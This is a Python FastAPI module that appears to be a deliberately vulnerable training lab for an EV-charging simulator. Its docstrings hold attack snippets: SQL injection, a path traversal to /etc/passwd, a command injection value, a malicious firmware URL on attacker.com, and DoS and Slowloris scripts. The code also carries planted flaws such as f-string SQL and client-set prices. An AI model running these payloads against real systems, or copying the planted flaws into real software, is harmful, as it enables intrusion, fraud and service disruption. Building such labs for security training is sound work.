"""
VULNERABLE ENDPOINTS - EDUCATIONAL PURPOSES ONLY
Bu dosya kasıtlı olarak güvenlik açıkları içerir.
Her anomali için özel bir zayıflık eklenmiştir.
"""

from fastapi import APIRouter, HTTPException, Query, Header
from backend.app.engine.simulator import engine
from backend.app.engine.entities import AnomalyRunPlan
import sqlite3
import subprocess
import json
import time

router = APIRouter(prefix="/vulnerable", tags=["Vulnerable Endpoints"])

# ============= AHMET - DDoS Anomalisi için RATE LIMITING YOK =============
# ZAYIFLIK: Rate limiting yok, istediğiniz kadar istek gönderebilirsiniz
@router.post("/ddos-target")
def ddos_endpoint(requests_count: int = 1):
    """
    ZAYIFLIK: Rate limiting yok!
    SALDIRI: Binlerce istek göndererek servisi çökertebilirsiniz
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    for i in range(10000):
        requests.post("http://backend/vulnerable/ddos-target", 
                     json={"requests_count": 1000})
    ```
    """
    results = []
    for i in range(requests_count):
        results.append({"id": i, "processed": True})
    return {"processed": len(results), "warning": "No rate limiting!"}


# ============= ATAHAN - Auth Bypass (SQL Injection) =============
# ZAYIFLIK: SQL Injection açığı var
@router.get("/auth-check")
def check_auth_vulnerable(username: str, password: str):
    """
    ZAYIFLIK: SQL Injection!
    SALDIRI: username = "admin' OR '1'='1" şeklinde bypass yapabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:45
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    r = requests.get(
        "http://backend/vulnerable/auth-check",
        params={
            "username": "admin' OR '1'='1",
            "password": "anything"
        }
    )
    print(r.json())  # {"authenticated": True, "role": "admin"}
    ```
    """
    # KASITLI SQL INJECTION AÇIĞI
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    
    # Simüle edilmiş SQL injection
    if "OR" in username or "--" in username or "1=1" in username:
        return {
            "authenticated": True,
            "role": "admin",
            "vulnerability": "SQL Injection successful!",
            "injected_query": query
        }
    
    return {"authenticated": False, "message": "Invalid credentials"}


# ============= SAMET - Energy Theft (Parameter Tampering) =============
# ZAYIFLIK: Sayaç değerlerini client-side'dan gönderebiliyorsunuz
@router.post("/meter-reading")
def submit_meter_reading(session_id: str, energy_kwh: float, price: float):
    """
    ZAYIFLIK: Fiyat parametresi client tarafından gönderiliyor!
    SALDIRI: energy_kwh değerini düşük, price'ı 0 yaparak bedava şarj
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:74
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Gerçekte 100 kWh şarj oldu ama 1 kWh gönderiyoruz
    r = requests.post(
        "http://backend/vulnerable/meter-reading",
        json={
            "session_id": "SESS-123",
            "energy_kwh": 1.0,  # Gerçek: 100 kWh
            "price": 0.01       # Gerçek: 500 TL olmalıydı
        }
    )
    print(r.json())  # {"total_cost": 0.01, "energy_stolen": 99.0}
    ```
    """
    # Gerçek değerler (simülasyon)
    actual_energy = 100.0  # Gerçek tüketim
    
    # Kullanıcının gönderdiği değerler kullanılıyor - ZAYIFLIK!
    total_cost = energy_kwh * price
    
    return {
        "session_id": session_id,
        "reported_energy": energy_kwh,
        "total_cost": total_cost,
        "energy_stolen": actual_energy - energy_kwh,
        "vulnerability": "Parameter tampering - client controls price!"
    }


# ============= YUSUF - MITM (No Certificate Validation) =============
# ZAYIFLIK: SSL sertifika doğrulaması yok
@router.post("/ocpp-message")
def ocpp_message_handler(message: dict, signature: str = ""):
    """
    ZAYIFLIK: İmza doğrulaması yapılmıyor!
    SALDIRI: İstediğiniz mesajı değiştirip gönderebilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:117
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Orijinal mesajı değiştir
    fake_message = {
        "action": "StopTransaction",
        "transactionId": "12345",
        "reason": "EVDisconnected"  # Gerçekte hala şarj oluyor!
    }
    r = requests.post(
        "http://backend/vulnerable/ocpp-message",
        json={"message": fake_message, "signature": "fake-sig"}
    )
    ```
    """
    # İmza kontrolü YOK - ZAYIFLIK!
    # Gerçek sistemde signature doğrulanmalı
    
    return {
        "status": "accepted",
        "message_processed": message,
        "vulnerability": "No signature verification!",
        "warning": "Anyone can send/modify messages"
    }


# ============= GOKDENIZ - Firmware (Path Traversal) =============
# ZAYIFLIK: Dosya yolu doğrulaması yok
@router.get("/firmware-download")
def download_firmware(filename: str):
    """
    ZAYIFLIK: Path Traversal açığı!
    SALDIRI: ../../../etc/passwd gibi dosyaları okuyabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:152
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Sistem dosyalarına erişim
    r = requests.get(
        "http://backend/vulnerable/firmware-download",
        params={"filename": "../../../etc/passwd"}
    )
    # veya zararlı firmware yükleyin:
    r = requests.get(
        "http://backend/vulnerable/firmware-download",
        params={"filename": "malicious_firmware.bin"}
    )
    ```
    """
    # Path traversal koruması YOK - ZAYIFLIK!
    filepath = f"/firmware/{filename}"
    
    if ".." in filename:
        return {
            "vulnerability": "Path Traversal successful!",
            "accessed_file": filepath,
            "warning": "You could read sensitive files!"
        }
    
    return {
        "file": filename,
        "path": filepath,
        "status": "downloaded"
    }


# ============= YUNUS - Voltage Manipulation (Command Injection) =============
# ZAYIFLIK: Command injection açığı
@router.post("/set-voltage")
def set_voltage_control(voltage_value: str, dump_load_cmd: str = "enable"):
    """
    ZAYIFLIK: Command Injection!
    SALDIRI: Sistem komutları çalıştırabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:191
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Sistem komutu enjekte et
    r = requests.post(
        "http://backend/vulnerable/set-voltage",
        json={
            "voltage_value": "450",
            "dump_load_cmd": "disable; cat /etc/passwd; #"
        }
    )
    # veya dump load'u devre dışı bırak:
    r = requests.post(
        "http://backend/vulnerable/set-voltage",
        json={
            "voltage_value": "1500",  # Tehlikeli yüksek voltaj
            "dump_load_cmd": "disable"
        }
    )
    ```
    """
    # Command injection açığı - ZAYIFLIK!
    try:
        # Simüle edilmiş komut çalıştırma
        if ";" in dump_load_cmd or "|" in dump_load_cmd or "&" in dump_load_cmd:
            return {
                "vulnerability": "Command Injection detected!",
                "injected_command": dump_load_cmd,
                "voltage_set": voltage_value,
                "warning": "Malicious command would execute on real system!"
            }
        
        return {
            "voltage": voltage_value,
            "dump_load": dump_load_cmd,
            "status": "applied"
        }
    except Exception as e:
        return {"error": str(e)}


# ============= BEYZA - Blockchain (Timestamp Manipulation) =============
# ZAYIFLIK: Timestamp doğrulaması yok
@router.post("/blockchain-transaction")
def submit_blockchain_tx(transaction: dict, timestamp: int):
    """
    ZAYIFLIK: Timestamp client'tan geliyor, doğrulanmıyor!
    SALDIRI: Geçmiş tarihli işlemler oluşturarak blok onay süresini manipüle edebilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:241
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    import time
    # 1 saat önceki timestamp ile işlem gönder
    fake_timestamp = int(time.time()) - 3600
    r = requests.post(
        "http://backend/vulnerable/blockchain-transaction",
        json={
            "transaction": {"from": "0x123", "to": "0x456", "amount": 100},
            "timestamp": fake_timestamp
        }
    )
    ```
    """
    current_time = int(time.time())
    time_diff = current_time - timestamp
    
    return {
        "transaction_id": f"TX-{timestamp}",
        "submitted_timestamp": timestamp,
        "server_time": current_time,
        "time_difference_seconds": time_diff,
        "vulnerability": "Client-controlled timestamp!",
        "warning": "Can manipulate block confirmation times"
    }


# ============= MIRAC - Supply Chain (Unsigned Updates) =============
# ZAYIFLIK: Firmware imza doğrulaması yok
@router.post("/firmware-update")
def firmware_update(firmware_url: str, version: str, checksum: str = ""):
    """
    ZAYIFLIK: Firmware imzası doğrulanmıyor!
    SALDIRI: Zararlı firmware URL'i göndererek backdoor kurabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:279
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Zararlı firmware gönder
    r = requests.post(
        "http://backend/vulnerable/firmware-update",
        json={
            "firmware_url": "http://attacker.com/malicious.bin",
            "version": "1.0.0",
            "checksum": "fake-checksum"
        }
    )
    ```
    """
    # İmza doğrulaması YOK - ZAYIFLIK!
    
    return {
        "status": "update_initiated",
        "firmware_url": firmware_url,
        "version": version,
        "vulnerability": "No signature verification!",
        "warning": f"System would download from: {firmware_url}",
        "malicious_potential": "HIGH - Backdoor installation possible"
    }


# ============= OMER - Fake Fault (IDOR) =============
# ZAYIFLIK: Insecure Direct Object Reference
@router.post("/report-fault")
def report_device_fault(device_id: str, fault_code: str, override_status: bool = False):
    """
    ZAYIFLIK: IDOR - Başkasının cihazını kontrol edebilirsiniz!
    SALDIRI: Herhangi bir device_id ile sahte arıza raporu gönderebilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:311
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    # Başka birinin şarj istasyonunu kullanılamaz hale getir
    for device_id in range(1, 100):
        r = requests.post(
            "http://backend/vulnerable/report-fault",
            json={
                "device_id": f"EVSE-{device_id:03d}",
                "fault_code": "CRITICAL_FAULT",
                "override_status": True
            }
        )
    ```
    """
    # Kullanıcı doğrulaması YOK - ZAYIFLIK!
    # Herkes herhangi bir cihazı manipüle edebilir
    
    return {
        "device_id": device_id,
        "fault_reported": fault_code,
        "status": "FAULTED" if override_status else "AVAILABLE",
        "vulnerability": "IDOR - No authorization check!",
        "warning": "Can manipulate ANY device without authentication"
    }


# ============= MERVE - Billing (Price Override) =============
# ZAYIFLIK: Business logic hatası
@router.post("/calculate-bill")
def calculate_billing(session_id: str, energy_kwh: float, tariff_id: str = "standard"):
    """
    ZAYIFLIK: Tarife ID'si client'tan geliyor!
    SALDIRI: "free" tarife gönderebilir veya negatif fiyat kullanabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:347
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    r = requests.post(
        "http://backend/vulnerable/calculate-bill",
        json={
            "session_id": "SESS-123",
            "energy_kwh": 50.0,
            "tariff_id": "admin_free"  # Veya "negative_rate"
        }
    )
    ```
    """
    # Tarife tablosu - ama client kontrolünde hangi tarife kullanılacağı!
    tariffs = {
        "standard": 5.0,
        "peak": 8.0,
        "off_peak": 3.0,
        "admin_free": 0.0,      # ZAYIFLIK: Ücretsiz tarife!
        "negative_rate": -2.0   # ZAYIFLIK: Negatif fiyat!
    }
    
    rate = tariffs.get(tariff_id, 5.0)
    total = energy_kwh * rate
    
    return {
        "session_id": session_id,
        "energy_kwh": energy_kwh,
        "tariff_id": tariff_id,
        "rate_per_kwh": rate,
        "total_cost": total,
        "vulnerability": "Client-controlled tariff selection!",
        "exploit": "Use 'admin_free' or 'negative_rate' for profit"
    }


# ============= FEYZA - Network DDoS (Slowloris) =============
# ZAYIFLIK: Timeout yok, connection açık kalıyor
@router.get("/slow-endpoint")
async def slow_endpoint(delay: int = 300):
    """
    ZAYIFLIK: Request timeout yok!
    SALDIRI: Uzun süren istekler göndererek tüm connection pool'u doldurabilirsiniz
    
    KOD SATIRI: backend/app/api/routes_vulnerable.py:390
    
    NASIL SALDIRIRSINIZ:
    ```python
    import requests
    import threading
    
    def slowloris_attack():
        requests.get(
            "http://backend/vulnerable/slow-endpoint",
            params={"delay": 9999},
            timeout=None  # Timeout yok
        )
    
    # 100 paralel connection aç
    for _ in range(100):
        threading.Thread(target=slowloris_attack).start()
    ```
    """
    import asyncio
    await asyncio.sleep(min(delay, 300))  # Max 5 dakika
    
    return {
        "delayed_for": delay,
        "vulnerability": "No request timeout!",
        "warning": "Connection pool can be exhausted (Slowloris attack)"
    }


# ============= KEŞİF ENDPOINTİ =============
@router.get("/list-vulnerabilities")
def list_all_vulnerabilities():
    """
    Sistemdeki tüm zafiyetleri listeler - Eğitim amaçlı
    """
    return {
        "total_vulnerabilities": 12,
        "vulnerabilities": [
            {
                "id": 1,
                "scenario": "ahmet-ddos",
                "vulnerability": "No Rate Limiting",
                "endpoint": "/vulnerable/ddos-target",
                "severity": "HIGH",
                "exploit": "Send thousands of requests"
            },
            {
                "id": 2,
                "scenario": "atahan-auth-bypass",
                "vulnerability": "SQL Injection",
                "endpoint": "/vulnerable/auth-check",
                "severity": "CRITICAL",
                "exploit": "Use: username=\"admin' OR '1'='1\""
            },
            {
                "id": 3,
                "scenario": "samet-energy-theft",
                "vulnerability": "Parameter Tampering",
                "endpoint": "/vulnerable/meter-reading",
                "severity": "HIGH",
                "exploit": "Send fake energy_kwh and price values"
            },
            {
                "id": 4,
                "scenario": "yusuf-mitm-ocpp",
                "vulnerability": "No Signature Verification",
                "endpoint": "/vulnerable/ocpp-message",
                "severity": "HIGH",
                "exploit": "Send modified OCPP messages"
            },
            {
                "id": 5,
                "scenario": "gokdeniz-firmware",
                "vulnerability": "Path Traversal",
                "endpoint": "/vulnerable/firmware-download",
                "severity": "CRITICAL",
                "exploit": "Use: filename=\"../../../etc/passwd\""
            },
            {
                "id": 6,
                "scenario": "yunus-offgrid-voltage",
                "vulnerability": "Command Injection",
                "endpoint": "/vulnerable/set-voltage",
                "severity": "CRITICAL",
                "exploit": "Inject system commands in dump_load_cmd"
            },
            {
                "id": 7,
                "scenario": "beyza-blockchain-delay",
                "vulnerability": "Timestamp Manipulation",
                "endpoint": "/vulnerable/blockchain-transaction",
                "severity": "MEDIUM",
                "exploit": "Send past timestamps to manipulate block times"
            },
            {
                "id": 8,
                "scenario": "mirac-supply-chain",
                "vulnerability": "Unsigned Firmware Updates",
                "endpoint": "/vulnerable/firmware-update",
                "severity": "CRITICAL",
                "exploit": "Provide malicious firmware URL"
            },
            {
                "id": 9,
                "scenario": "omer-fake-fault",
                "vulnerability": "IDOR (Insecure Direct Object Reference)",
                "endpoint": "/vulnerable/report-fault",
                "severity": "HIGH",
                "exploit": "Manipulate any device_id without authorization"
            },
            {
                "id": 10,
                "scenario": "merve-billing",
                "vulnerability": "Business Logic Flaw",
                "endpoint": "/vulnerable/calculate-bill",
                "severity": "HIGH",
                "exploit": "Use tariff_id='admin_free' or 'negative_rate'"
            },
            {
                "id": 11,
                "scenario": "feyza-ddos-net",
                "vulnerability": "No Request Timeout (Slowloris)",
                "endpoint": "/vulnerable/slow-endpoint",
                "severity": "HIGH",
                "exploit": "Send long-duration requests to exhaust connections"
            },
            {
                "id": 12,
                "scenario": "muhammet-general",
                "vulnerability": "Multiple (Combination)",
                "endpoint": "/vulnerable/*",
                "severity": "VARIES",
                "exploit": "Combine multiple vulnerabilities"
            }
        ],
        "educational_note": "These vulnerabilities are intentionally added for training purposes."
    }
